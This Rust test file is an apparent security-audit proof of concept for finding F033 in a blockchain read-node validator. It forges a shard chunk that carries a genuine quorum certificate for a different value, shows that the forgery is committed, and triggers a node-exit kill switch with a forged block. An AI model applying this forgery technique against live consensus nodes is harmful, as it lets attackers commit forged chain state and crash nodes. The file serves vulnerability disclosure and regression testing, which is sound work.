//! F033 PoC: the read-node decided-value path verifies that a value's `Commits`
//! are a genuine quorum certificate, but never binds `commits.value.hash` /
//! `commits.height` to the decided value itself. So a genuine certificate for
//! one value is accepted when it is wrapped around a different, attacker-built
//! value, and that forged value is committed.
//!
//! This drives the REAL `ReadValidator::process_decided_value` path on a real
//! `ShardEngine`, using the same harness shape as `read_validator_test.rs`.
//!
//! Wired as `#[cfg(test)] mod f033_poc_test;` in `src/consensus/mod.rs`.

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use crate::consensus::consensus::{SystemMessage, ValidatorSetConfig};
    use crate::consensus::read_validator::{Engine, ReadValidator};
    use crate::consensus::validator::{StoredValidatorSet, StoredValidatorSets};
    use crate::core::types::{Address, ShardId};
    use crate::proto::{self, Height, ShardChunk};
    use crate::storage::store::engine::ShardEngine;
    use crate::storage::store::test_helper::{
        self, commit_event, default_storage_event, new_engine_with_options, sign_chunk,
        EngineOptions, FID_FOR_TEST,
    };
    use libp2p::identity::ed25519::Keypair;
    use prost::Message;
    use tokio::sync::mpsc;

    /// A read-node `ReadValidator` with a real shard engine and a single
    /// genuine proposer validator in the set (quorum = 1). `last_height = 0`,
    /// so a value at height 1 commits immediately. Identical to the setup in
    /// `read_validator_test.rs`.
    async fn setup() -> (
        ShardEngine,
        ReadValidator,
        Keypair,
        mpsc::Receiver<SystemMessage>,
    ) {
        let proposer_keypair = Keypair::generate();
        let (proposer_engine, _) = test_helper::new_engine().await;
        let (read_node_engine, _) = test_helper::new_engine().await;

        let (read_node_engine_clone, _) = new_engine_with_options(EngineOptions {
            db: Some(read_node_engine.db.clone()),
            ..Default::default()
        })
        .await;

        let proposer_address = Address(proposer_keypair.public().to_bytes());
        let validator_set_config = ValidatorSetConfig {
            effective_at: 0,
            validator_public_keys: vec![proposer_address.to_hex()],
            shard_ids: vec![read_node_engine.shard_id()],
        };
        let validator_sets = vec![StoredValidatorSet::new(
            ShardId::new(read_node_engine.shard_id()),
            &validator_set_config,
        )];

        let (system_tx, system_rx) = mpsc::channel(100);
        let read_validator = ReadValidator {
            shard_id: read_node_engine.shard_id(),
            last_height: Height {
                shard_index: read_node_engine.shard_id(),
                block_number: 0,
            },
            engine: Engine::ShardEngine(read_node_engine_clone),
            max_num_buffered_blocks: 1,
            buffered_blocks: BTreeMap::new(),
            statsd_client: test_helper::statsd_client(),
            validator_sets: StoredValidatorSets::new(read_node_engine.shard_id(), validator_sets),
            system_tx,
            pivot_guard: None,
        };
        (proposer_engine, read_validator, proposer_keypair, system_rx)
    }

    /// A genuinely proposed + quorum-signed shard chunk at the proposer
    /// engine's next height. Its `commits.value.hash == hash == blake3(header)`.
    async fn genuine_chunk(engine: &mut ShardEngine, kp: &Keypair) -> ShardChunk {
        let chunk = commit_event(engine, &default_storage_event(FID_FOR_TEST)).await;
        sign_chunk(kp, chunk).await
    }

    fn shard_value(chunk: ShardChunk) -> proto::DecidedValue {
        proto::DecidedValue {
            value: Some(proto::decided_value::Value::Shard(chunk)),
        }
    }

    fn blake3_header(chunk: &ShardChunk) -> Vec<u8> {
        blake3::hash(&chunk.header.as_ref().unwrap().encode_to_vec())
            .as_bytes()
            .to_vec()
    }

    /// Build an attacker value: a chunk whose header/body (and therefore whose
    /// `hash`) differ from the value the quorum actually signed, but which
    /// carries the genuine `commits` of `genuine`. We change a header field
    /// that is NOT part of the state-replay (`parent_hash`), so the body still
    /// replays to the same `shard_root` and the engine commits it. `hash` is
    /// re-derived from the new header, so `validate_block_hash_matches_header`
    /// passes. `commits` is untouched, so `verify_signatures` passes — the
    /// quorum signed `commits.value.hash`, which is the OLD hash.
    fn forge_different_value(genuine: &ShardChunk) -> ShardChunk {
        let mut forged = genuine.clone();
        let header = forged.header.as_mut().unwrap();
        header.parent_hash = vec![0xEE; 32]; // attacker-chosen, != genuine parent
        forged.hash = blake3_header(&forged); // satisfy the F012 header-binding check
        forged
    }

    // --- PoC: genuine certificate for value A accepted around a forged value B ---

    #[tokio::test]
    async fn f033_forged_value_with_genuine_foreign_commits_is_committed() {
        let (mut proposer_engine, mut read_validator, proposer_keypair, mut system_rx) =
            setup().await;

        let genuine = genuine_chunk(&mut proposer_engine, &proposer_keypair).await;
        let signed_hash = genuine
            .commits
            .as_ref()
            .unwrap()
            .value
            .as_ref()
            .unwrap()
            .hash
            .clone();

        let forged = forge_different_value(&genuine);

        // The forged value is a genuinely different value: its own hash differs
        // from the hash the quorum actually signed.
        assert_ne!(
            forged.hash, signed_hash,
            "forged value must differ from the signed value"
        );
        assert_eq!(
            forged.commits.as_ref().unwrap().value.as_ref().unwrap().hash,
            signed_hash,
            "forged value carries the genuine certificate for a DIFFERENT value"
        );

        let processed = read_validator
            .process_decided_value(shard_value(forged.clone()))
            .await;

        println!(
            "F033: forged chunk (hash {}) carrying a genuine quorum certificate for a \
             different value (signed hash {}) -> process_decided_value committed = {}",
            hex::encode(&forged.hash[..4]),
            hex::encode(&signed_hash[..4]),
            processed,
        );

        assert_eq!(
            processed, 1,
            "forged value was NOT committed; binding may now exist"
        );
        assert_eq!(read_validator.last_height.block_number, 1);
        assert!(
            system_rx.try_recv().is_err(),
            "no exit expected on this path"
        );
    }

    // --- Control: a correctly bound genuine value is accepted ---

    #[tokio::test]
    async fn f033_control_genuine_value_accepted() {
        let (mut proposer_engine, mut read_validator, proposer_keypair, _rx) = setup().await;
        let genuine = genuine_chunk(&mut proposer_engine, &proposer_keypair).await;

        // Sanity: this value IS correctly bound (hash == signed value == blake3(header)).
        assert_eq!(genuine.hash, blake3_header(&genuine));
        assert_eq!(
            genuine.hash,
            genuine.commits.as_ref().unwrap().value.as_ref().unwrap().hash
        );

        let processed = read_validator
            .process_decided_value(shard_value(genuine))
            .await;
        println!("F033 control: genuine bound value -> committed = {}", processed);
        assert_eq!(processed, 1);
        assert_eq!(read_validator.last_height.block_number, 1);
    }

    // --- Control: a certificate below quorum is rejected ---

    #[tokio::test]
    async fn f033_control_below_quorum_rejected() {
        let (mut proposer_engine, mut read_validator, proposer_keypair, _rx) = setup().await;
        let genuine = genuine_chunk(&mut proposer_engine, &proposer_keypair).await;

        // Same forged value, but strip the signatures so the certificate is
        // below quorum (0 of 1). Everything else is identical.
        let mut forged = forge_different_value(&genuine);
        forged.commits.as_mut().unwrap().signatures.clear();

        let processed = read_validator
            .process_decided_value(shard_value(forged))
            .await;
        println!(
            "F033 control: forged value with a below-quorum certificate -> committed = {}",
            processed
        );
        assert_eq!(processed, 0, "below-quorum certificate must be rejected");
        assert_eq!(read_validator.last_height.block_number, 0);
    }

    // --- Secondary (impact a): the version-exit kill switch is real code. ---
    // Reaching it through the full `process_decided_value` needs a shard-0
    // BlockEngine fixture (a Block sent to this ShardEngine is dropped by
    // `matches_engine` before the version check). We exercise the real exit
    // function `validate_protocol_version` directly on a forged Block: a bad
    // `header.version` emits `SystemMessage::ExitWithError`. In production the
    // Block arrives on the shard-0 read path carrying any genuine shard-0
    // `Commits` (unbound, per this finding), so one gossip frame reaches this
    // exit. That end-to-end wiring is source-only here.
    #[tokio::test]
    async fn f033_version_exit_is_reachable_on_forged_block() {
        let (_proposer_engine, read_validator, _kp, mut system_rx) = setup().await;

        let forged_block = proto::DecidedValue {
            value: Some(proto::decided_value::Value::Block(proto::Block {
                header: Some(proto::BlockHeader {
                    height: Some(Height {
                        shard_index: read_validator.shard_id,
                        block_number: 1,
                    }),
                    version: 0xFFFF, // not the expected protocol version
                    timestamp: 1,
                    chain_id: 1, // Mainnet
                    ..Default::default()
                }),
                ..Default::default()
            })),
        };

        let ok = read_validator.validate_protocol_version(&forged_block);
        println!(
            "F033 secondary: validate_protocol_version(bad version) = {} (false => exit)",
            ok
        );
        assert!(!ok);
        match system_rx.try_recv() {
            Ok(SystemMessage::ExitWithError(_)) => {}
            other => panic!("expected ExitWithError, got {:?}", other),
        }
    }
}
